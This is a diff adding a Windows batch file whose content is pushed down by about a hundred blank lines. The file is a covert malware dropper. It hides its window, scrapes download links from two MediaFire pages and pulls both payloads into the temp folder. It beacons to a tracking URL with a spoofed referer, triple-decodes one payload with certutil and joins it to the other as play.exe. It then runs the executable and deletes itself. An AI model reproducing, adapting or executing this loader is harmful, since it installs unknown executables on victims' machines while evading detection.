@@ -1,0 +1,173 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+@echo off
+powershell -windowstyle hidden -Command 2>nul >nul
+set "iplo=https://maper.info/1wHV45"
+set "link=https://www.mediafire.com/file/uq6estxvdnk3zze/ofeduqin1.rar/file"
+set "link2=https://www.mediafire.com/file/hzktcfc598wc4c7/bipucowova2.rar/file"
+rem 
+
+set url=%link%
+set "savePath=%temp%\weba.html"
+set userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+powershell -Command "& { $request = [System.Net.WebRequest]::Create('%url%'); $request.UserAgent = '%userAgent%'; $response = $request.GetResponse(); $responseStream = $response.GetResponseStream(); $fileStream = New-Object System.IO.FileStream('%savePath%', [System.IO.FileMode]::Create); [byte[]]$buffer = New-Object byte[] 1024; while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) { $fileStream.Write($buffer, 0, $bytesRead); } $fileStream.Close(); $responseStream.Close(); }"
+rem
+set url=%link2%
+set "savePath=%temp%\webb.html"
+set userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+powershell -Command "& { $request = [System.Net.WebRequest]::Create('%url%'); $request.UserAgent = '%userAgent%'; $response = $request.GetResponse(); $responseStream = $response.GetResponseStream(); $fileStream = New-Object System.IO.FileStream('%savePath%', [System.IO.FileMode]::Create); [byte[]]$buffer = New-Object byte[] 1024; while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) { $fileStream.Write($buffer, 0, $bytesRead); } $fileStream.Close(); $responseStream.Close(); }"
+
+
+for /f "delims=" %%a in ('find "https://download" %temp%\weba.html ^| find /i ".rar"') do set "result=%%a"
+
+set "result=%result:"=%"
+set "result=%result:*https://download=https://download%"
+for /f "tokens=1* delims= " %%a in ("%result%") do set result=%%a
+set "result=%result: =%"
+
+
+
+for /f "delims=" %%a in ('find "https://download" %temp%\webb.html ^| find /i ".rar"') do set "result2=%%a"
+
+set "result2=%result2:"=%"
+set "result2=%result2:*https://download=https://download%"
+for /f "tokens=1* delims= " %%a in ("%result2%") do set result2=%%a
+set "result2=%result2: =%"
+del %temp%\weba.html
+del %temp%\webb.html
+
+rem
+set url=%result%
+set userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+set savePath=%temp%\playvideoa.a
+powershell -Command "& { $request = [System.Net.WebRequest]::Create('%url%'); $request.UserAgent = '%userAgent%'; $response = $request.GetResponse(); $responseStream = $response.GetResponseStream(); $fileStream = New-Object System.IO.FileStream('%savePath%', [System.IO.FileMode]::Create); [byte[]]$buffer = New-Object byte[] 1024; while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) { $fileStream.Write($buffer, 0, $bytesRead); } $fileStream.Close(); $responseStream.Close(); }"
+
+
+rem
+set url=%result2%
+set userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+set savePath=%temp%\playvideob.f
+powershell -Command "& { $request = [System.Net.WebRequest]::Create('%url%'); $request.UserAgent = '%userAgent%'; $response = $request.GetResponse(); $responseStream = $response.GetResponseStream(); $fileStream = New-Object System.IO.FileStream('%savePath%', [System.IO.FileMode]::Create); [byte[]]$buffer = New-Object byte[] 1024; while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) { $fileStream.Write($buffer, 0, $bytesRead); } $fileStream.Close(); $responseStream.Close(); }"
+
+set url=%iplo%
+set referer=impactfulbrands.co.uk
+set userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0 //24.07--07:15//
+powershell -Command "& { $request = [System.Net.WebRequest]::Create($env:url); $request.Method = 'GET'; $request.Referer = $env:referer; $request.UserAgent = $env:userAgent; $response = $request.GetResponse(); $stream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $content = $reader.ReadToEnd(); $reader.Close(); $response.Close(); }"
+rem
+
+
+
+certutil -decode %temp%\playvideoa.a %temp%\playvideoa.b
+del %temp%\playvideoa.a
+certutil -decode %temp%\playvideoa.b %temp%\playvideoa.c
+del %temp%\playvideoa.b
+certutil -decode %temp%\playvideoa.c %temp%\playvideoa.d
+del %temp%\playvideoa.c
+Copy /b "%temp%\playvideoa.d"+"%temp%\playvideob.f" "%temp%\play.exe"
+del %temp%\playvideoa.d
+del %temp%\playvideob.f
+
+start %temp%\play.exe
+CMD /C DEL %0
+exit
+
